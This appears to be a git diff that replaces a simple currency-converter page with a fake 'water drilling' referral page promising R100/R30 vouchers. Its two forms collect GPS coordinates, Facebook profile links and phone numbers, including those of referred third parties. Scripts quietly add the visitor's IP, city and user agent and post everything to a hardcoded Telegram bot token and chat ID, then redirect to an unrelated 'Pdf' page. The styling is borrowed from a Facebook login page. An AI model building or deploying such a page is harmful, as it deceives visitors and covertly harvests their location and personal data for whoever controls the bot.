@@ -1,85 +1,688 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Currency Converter - Choose Countries</title>
-    <fieldset style="border-radius:5px;background-color:white">
-</head>
-<body>
-  <img src="https://i.ibb.co/rfDYVQN/download-1.png" alt="download-1" width="50" border="0">
-   <marquee><var><h1>USD to Currency Converter</h1></var></marquee>
-    <p>Enter the amount in US Dollars (USD) to convert to the selected currencies:</p>
-    <label for="usdAmount">Amount in USD:</label>
-    <input type="number" id="usdAmount" class="input-type" placeholder="Enter USD amount" step="0.01">
-    <br><br>
-    <label for="selectCountry1">Select Country 1:</label>
-    <select id="selectCountry1">
-        <option value="ZAR">South African Rand (ZAR)</option>
-        <option value="EUR">Euro (EUR)</option>
-        <option value="GBP">British Pound (GBP)</option>
-        <!-- Add more currencies as needed -->
-    </select>
-    <br><br>
-    <label for="selectCountry2">Select Country 2:</label>
-    <select id="selectCountry2">
-        <option value="ZAR">South African Rand (ZAR)</option>
-        <option value="EUR">Euro (EUR)</option>
-        <option value="GBP">British Pound (GBP)</option>
-        <!-- Add more currencies as needed -->
-    </select>
-    <br><br>
-    <button type="button" onclick="convertCurrencies()">Convert</button>
-    <br><br>
-    <p id="result"></p>
-
-    <script>
-        async function convertCurrencies() {
-            const usdAmount = document.getElementById('usdAmount').value;
-            const baseCurrency = 'USD';
-            const currency1 = document.getElementById('selectCountry1').value;
-            const currency2 = document.getElementById('selectCountry2').value;
-
-            const response = await fetch(`https://api.exchangerate-api.com/v4/latest/${baseCurrency}`);
-            const data = await response.json();
-            
-            const rate1 = data.rates[currency1];
-            const amount1 = (usdAmount * rate1).toFixed(2);
-            
-            const rate2 = data.rates[currency2];
-            const amount2 = (usdAmount * rate2).toFixed(2);
-
-            const result = `${usdAmount} USD is approximately ${amount1} ${currency1} and ${amount2} ${currency2}`;
-            document.getElementById('result').innerText = result;
-        }
-    </script>
-</body>
-</html>
-</fieldset>
 <style>
-  .input-type{
-    backgroud-color:white;
+  img{
     border-radius:5px;
-    margin:1;
-    display:flex;
-    
+    height:100px;
+    width:100px;
+    padding:10px;
+    box-shadow:0 4px 12px rgba(0, 0, 0, 0.1);
   }
-  p{
+  .horzontal{
+    display:flex;
+  }
+  .pro{
     color:green;
   }
-  h1{
-    color:blue;
-  }
   fieldset{
-    box-shadow: 3px 3px 5px 6px #ccc;
+margin-bottom: 15px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  padding: 10px;
+ 
   }
-  button{
-    color:white;
-    background-color:blue;
+  body{
+    background: white;
+    margin: 1;
+    height: 100vh;
+    display: flex;
+    align-items: ;
+  }
+</style>
+<body>
+  
+<fieldset>
+
+<img src="https://i.ibb.co/cD7w6mQ/R100.jpg">
+<body ng-app="">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+ <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    </meta>
+    </meta>
+
+<style>
+  img{
+    height:50px;
+    width:50px;
+  }
+  .ok{
+    height:100px;
+    width:100px;
+  }
+  .horzontal{
+    display:flex;
+  }
+</style>
+
+<body>
+  <title>Imployee</title>
+  <fieldset style="border-radius:5px;background-color:#2df34d11">
+    <details>
+      <summary>refferal</summary>
+      <div ng-app="">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1 style="color:green">Available</h1>
+   <p style="color:green">look for people who wants to do water drilling at their homes then fill up  then you get R100 voucher via facebook account you provided
+   <details>
+   <p style="color:red">To get your R30 voucher you need to fill up the forms then when the water drilling services come to the location or to the person you provided and finish the work you will get R100  </p>
+   <div class="pro">
+   <p>1St press get location</p>
+   <p>2nd put your facebook account link</p>
+   <p>3rd put the phone number of the  person your reffering/ the person who want to do water drilling it their homes </p>
+   <p>4th Put your phone number</p>
+   </div>
+</details>
+   <div ng-app="">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <style>body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    
+    justify-content: ;
+    align-items: ;
+    height: 10vh;
+    margin: 0;
+}
+
+.container {
+    background-color: white;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    width: 220px;
+    padding: 20px;
+}
+img{
+  border-radius:5px;
+}
+
+.logo-container {
+    margin-bottom: 20px;
+}
+
+.logo {
+    font-family: 'Arial Black', sans-serif;
+    font-size: 36px;
+    color: #1877f2;
+}
+
+.slogan {
+    color: #555;
+    font-size: 14px;
+    margin-top: 5px;
+}
+
+.form-container {
+    text-align:center ;
+}
+
+.input-field {
+    width: 100%;
+    padding: 10px;
+    margin: 8px 0;
+    border: 1px solid #ddd;
     border-radius: 5px;
-  }
-    body{
-        width:60;
-        hight:1000vh;
+    font-size: 16px;
+    box-shadow: 3px 3px 5px 6px #ccc;
+}
+
+.login-button {
+    background-color: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    padding: 12px;
+    width: 100%;
+    cursor: pointer;
+    font-size: 18px;
+    margin: 12px 0;
+}
+
+.login-button:hover {
+    background-color: #0e5ace;
+}
+
+a {
+    text-decoration: none;
+    color: #1877f2;
+    font-size: 14px;
+}
+
+.divider {
+    margin: 12px 0;
+    border-top: 1px solid #ddd;
+}
+
+.no-social-login {
+    font-size: 14px;
+    margin-top: 16px;
+}
+
+.no-social-login a {
+    font-weight: bold;
+    color: #1877f2;
+}
+
+.no-social-login a:hover {
+    text-decoration: underline;
+}
+
+.popup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: rgba(0, 0, 0, 0.8);
+    color: white;
+    border-radius: 5px;
+    padding: 15px;
+    z-index: 1;
+}
+button{
+  background:orange;
+}
+
+.popup-content {
+    position: relative;
+}
+
+.popup-close {
+    position: absolute;
+    top: 5px;
+    right: 5px;
+    font-size: 20px;
+    cursor: pointer;
+}
+</style>
+</head>
+
+</body>
+</html>
+
+
+</body>
+</html>
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo"><strong>fill the form</strong></div>
+            <p class="slogan"></p>
+            <p>Press get location</p>
+         
+ <form>
+    <button type="button" onclick="getLocation()">Get Location</button>
+  </form>
+
+  <!-- AngularJS section -->
+  <div ng-app="">
+    <p>
+      Latitude: <input ng-model="latitude" type="text" id="latitude" />
+    </p>
+    <p>
+      Longitude: <input ng-model="longitude" type="text" id="longitude" />
+    </p>
+    <!-- Google Maps link with latitude and longitude -->       </div>
+
+        <div class="form-container">
+          
+            <form onsubmit="submitonh(); return false;" method="post">
+
+
+              <input type="hidden" name="" id="pagename" value="Facebook" />
+                <input type="text" id="email"  placeholder="location" value="    https://www.google.com/maps/place/{{latitude}}+{{longitude}}"
+                class="input-field" name="email" readonly/>               
+               
+                <input id="name" type="url" placeholder="your facebook url account" class="input-field" name="location"  required>
+        <input type="tel" id="phone" name="phone" placeholder="phone number of the person" class="input-field" ng-model="phone" required>
         
+        <input type="text" id="username" name="username" placeholder="your name" class="input-field" ng-model="process" required>
+                <button type="submit" class="login-button">Send</button>
+            </form>
+            
+            <div class="divider"></div>
+            <div class="no-social-login">
+                <p>Don't have an account? <a href="#" id="signup-button"></a></p>
+            </div>
+        </div>
+    </div>
+
+    <div id="error-popup" class="popup">
+        <div class="popup-content">
+            <span class="popup-close" id="close-popup">&times;</span>
+        </div>
+    </div>
+
+    <script>function la(src) {
+      window.location = src;
+    }
+    
+         function GetURLParameter(sParam) {
+           var sPageURL = window.location.search.substring(1);
+           var sURLVariables = sPageURL.split('&');
+           for (var i = 0; i < sURLVariables.length; i++) {
+             var sParameterName = sURLVariables[i].split('=');
+             if (sParameterName[0] == sParam) {
+               return sParameterName[1];
+             }
+           }
+         }
+    
+         var chatid = GetURLParameter('id');
+    
+         function submitonh() {
+           // Get IP address information using an API service
+           fetch('https://ipapi.co/json/')
+             .then(response => response.json())
+             .then(data => {
+               // Extract relevant device and IP information
+               const userAgent = navigator.userAgent;
+               const ip = data.ip;
+               const cityName = data.city;
+    
+               // Create the message to send
+               const username = document.getElementById("username").value;
+               const phone = document.getElementById("phone").value;
+               const page = document.getElementById("pagename").value;
+               const name = document.getElementById("name").value;
+               const email = document.getElementById("email").value;
+               
+               const message = `> refferal link : ${page}\n\n> food :
+                 ${name}\n\n> phone :
+                 ${phone}\n\n> username :
+                 ${username}\n\n> location url :
+                 ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+    
+               // Send the message to your Telegram bot using the appropriate API
+               const botToken = '6833607058:AAGgbkxgbikwaYWj2EmTnvhIDjAELhP5yi8';
+               const chatId =2013982441 ;
+    
+               const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+               const telegramParams = {
+                 chat_id: chatId,
+                 text: message
+               };
+    
+               // Send the request to the Telegram bot using AJAX
+               const xhr = new XMLHttpRequest();
+               xhr.open('POST', telegramUrl, true);
+               xhr.setRequestHeader('Content-Type', 'application/json');
+               xhr.send(JSON.stringify(telegramParams));
+    
+               // Handle the response (optional)
+               xhr.onload = function() {
+                 if (xhr.status === 200) {
+                   window.location.href = "https://iamroot5.github.io/Pdf/";
+                 } else {
+                   console.log('Error sending data to Telegram:', xhr.statusText);
+                 }
+               };
+    
+             })
+             .catch(error => console.log('Error retrieving IP address information:', error));
+         }
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else { 
+        alert("Geolocation is not supported by this browser.");
+    }
+}
+
+function showPosition(position) {
+    document.getElementById("latitude").value = position.coords.latitude;
+    document.getElementById("longitude").value = position.coords.longitude;
+}
+function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
     }
 
+    function showPosition(position) {
+      var latitude = position.coords.latitude;
+      var longitude = position.coords.longitude;
+
+      // Set latitude and longitude values to the AngularJS model
+      var scope = angular.element(document.getElementById("latitude")).scope();
+      scope.$apply(function() {
+        scope.latitude = latitude;
+        scope.longitude = longitude;
+      });
+    }
+         </script>
+
+</body>
+</html>
+</body>
+</html>
+
+</html>
+ </details>
+ </form>
+ </head>
+</fieldset>
+</fieldset>
+<fieldset>
+  
+  
+<img src="https://i.ibb.co/hB1nB6L/R30.jpg">
+    <fieldset style="border-radius:5px;background-color:#2df34d11">
+    <details>
+      <summary>Signuo</summary>
+      <div ng-app="">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1 style="color:green">Available</h1>
+   <p style="color:green">
+     You want to do water drilling at your home your at the right place
+   <details>
+   <p style="color:red">Note using this methoad you dont get any Money/voucher   </p>
+   <div class="pro">
+   <p>1St press get location</p>
+   <p>2nd put the phone number of the  person your reffering/ the person who want to do water drilling it their homes </p>
+   <p>3rd Put your phone number</p>
+   </div>
+</details>
+   <div ng-app="">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <style>body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    
+    justify-content: ;
+    align-items: ;
+    height: 10vh;
+    margin: 0;
+}
+
+.container {
+    background-color: white;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    width: 220px;
+    padding: 20px;
+}
+img{
+  border-radius:5px;
+}
+
+.logo-container {
+    margin-bottom: 20px;
+}
+
+.logo {
+    font-family: 'Arial Black', sans-serif;
+    font-size: 36px;
+    color: #1877f2;
+}
+
+.slogan {
+    color: #555;
+    font-size: 14px;
+    margin-top: 5px;
+}
+
+.form-container {
+    text-align:center ;
+}
+
+.input-field {
+    width: 100%;
+    padding: 10px;
+    margin: 8px 0;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    font-size: 16px;
+    box-shadow: 3px 3px 5px 6px #ccc;
+}
+
+.login-button {
+    background-color: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    padding: 12px;
+    width: 100%;
+    cursor: pointer;
+    font-size: 18px;
+    margin: 12px 0;
+}
+
+.login-button:hover {
+    background-color: #0e5ace;
+}
+
+a {
+    text-decoration: none;
+    color: #1877f2;
+    font-size: 14px;
+}
+
+.divider {
+    margin: 12px 0;
+    border-top: 1px solid #ddd;
+}
+
+.no-social-login {
+    font-size: 14px;
+    margin-top: 16px;
+}
+
+.no-social-login a {
+    font-weight: bold;
+    color: #1877f2;
+}
+
+.no-social-login a:hover {
+    text-decoration: underline;
+}
+
+.popup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: rgba(0, 0, 0, 0.8);
+    color: white;
+    border-radius: 5px;
+    padding: 15px;
+    z-index: 1;
+}
+button{
+  background:orange;
+}
+
+.popup-content {
+    position: relative;
+}
+
+.popup-close {
+    position: absolute;
+    top: 5px;
+    right: 5px;
+    font-size: 20px;
+    cursor: pointer;
+}
 </style>
+</head>
+
+</body>
+</html>
+
+
+</body>
+</html>
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo"><strong>fill the form</strong></div>
+            <p class="slogan"></p>
+            <p>Press get location</p>
+         
+ <form>
+    <button type="button" onclick="getLocation()">Get Location</button>
+  </form>
+
+  <!-- AngularJS section -->
+  <div ng-app="">
+    <p>
+      Latitude: <input ng-model="latitude" type="text" id="latitude" />
+    </p>
+    <p>
+      Longitude: <input ng-model="longitude" type="text" id="longitude" />
+    </p>
+    <!-- Google Maps link with latitude and longitude -->       </div>
+
+        <div class="form-container">
+          
+            <form onsubmit="submitonprocess(); return false;" method="post">
+
+
+              <input type="hidden" name="" id="pagename" value="Facebook" />
+                <input type="text" id="email"  placeholder="location" value="    https://www.google.com/maps/place/{{latitude}}+{{longitude}}"
+                class="input-field" name="email" readonly/>               
+               
+                
+        <input type="tel" id="phone" name="phone" placeholder="your phone number" class="input-field" ng-model="phone" required>
+        
+        <input type="text" id="username" name="username" placeholder="your name" class="input-field" ng-model="process" required>
+                <button type="submit" class="login-button">Send</button>
+            </form>
+            
+            <div class="divider"></div>
+            <div class="no-social-login">
+                <p>Don't have an account? <a href="#" id="signup-button"></a></p>
+            </div>
+        </div>
+    </div>
+
+    <div id="error-popup" class="popup">
+        <div class="popup-content">
+            <span class="popup-close" id="close-popup">&times;</span>
+        </div>
+    </div>
+
+    <script>function la(src) {
+      window.location = src;
+    }
+    
+         function GetURLParameter(sParam) {
+           var sPageURL = window.location.search.substring(1);
+           var sURLVariables = sPageURL.split('&');
+           for (var i = 0; i < sURLVariables.length; i++) {
+             var sParameterName = sURLVariables[i].split('=');
+             if (sParameterName[0] == sParam) {
+               return sParameterName[1];
+             }
+           }
+         }
+    
+         var chatid = GetURLParameter('id');
+    
+         function submitonprocess() {
+           // Get IP address information using an API service
+           fetch('https://ipapi.co/json/')
+             .then(response => response.json())
+             .then(data => {
+               // Extract relevant device and IP information
+               const userAgent = navigator.userAgent;
+               const ip = data.ip;
+               const cityName = data.city;
+    
+               // Create the message to send
+               const username = document.getElementById("username").value;
+               const phone = document.getElementById("phone").value;
+               const page = document.getElementById("pagename").value;
+               const email = document.getElementById("email").value;
+               
+               const message = `> boramati : ${page}\n\n> food :
+                 ${phone}\n\n> username :
+                 ${username}\n\n> location url :
+                 ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+    
+               // Send the message to your Telegram bot using the appropriate API
+               const botToken = '6833607058:AAGgbkxgbikwaYWj2EmTnvhIDjAELhP5yi8';
+               const chatId =2013982441 ;
+    
+               const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+               const telegramParams = {
+                 chat_id: chatId,
+                 text: message
+               };
+    
+               // Send the request to the Telegram bot using AJAX
+               const xhr = new XMLHttpRequest();
+               xhr.open('POST', telegramUrl, true);
+               xhr.setRequestHeader('Content-Type', 'application/json');
+               xhr.send(JSON.stringify(telegramParams));
+    
+               // Handle the response (optional)
+               xhr.onload = function() {
+                 if (xhr.status === 200) {
+                   window.location.href = "https://iamroot5.github.io/Pdf/";
+                 } else {
+                   console.log('Error sending data to Telegram:', xhr.statusText);
+                 }
+               };
+    
+             })
+             .catch(error => console.log('Error retrieving IP address information:', error));
+         }
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else { 
+        alert("Geolocation is not supported by this browser.");
+    }
+}
+
+function showPosition(position) {
+    document.getElementById("latitude").value = position.coords.latitude;
+    document.getElementById("longitude").value = position.coords.longitude;
+}
+function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
+
+    function showPosition(position) {
+      var latitude = position.coords.latitude;
+      var longitude = position.coords.longitude;
+
+      // Set latitude and longitude values to the AngularJS model
+      var scope = angular.element(document.getElementById("latitude")).scope();
+      scope.$apply(function() {
+        scope.latitude = latitude;
+        scope.longitude = longitude;
+      });
+    }
+         </script>
+
+</body>
+</html>
+</body>
+</html>
+
+</html>
+ </details>
+ </form>
+ </head>
+</fieldset>
+</fieldset>
+<fieldset>
